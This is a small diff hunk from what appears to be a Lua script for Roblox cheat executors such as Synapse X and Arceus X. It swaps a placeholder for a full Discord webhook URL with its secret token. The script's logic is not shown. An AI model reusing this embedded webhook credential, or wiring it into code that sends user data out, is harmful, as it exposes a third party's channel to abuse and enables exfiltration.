@@ -4,7 +4,7 @@
 -- Synapse X / Arceus X / Hydrogen / Zorara
 -- =============================================
 
-local WEBHOOK = "YOUR_WEBHOOK_HERE"
+local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"
 
 -- =============================================
 -- EXECUTOR DETECTION + COMPAT LAYER
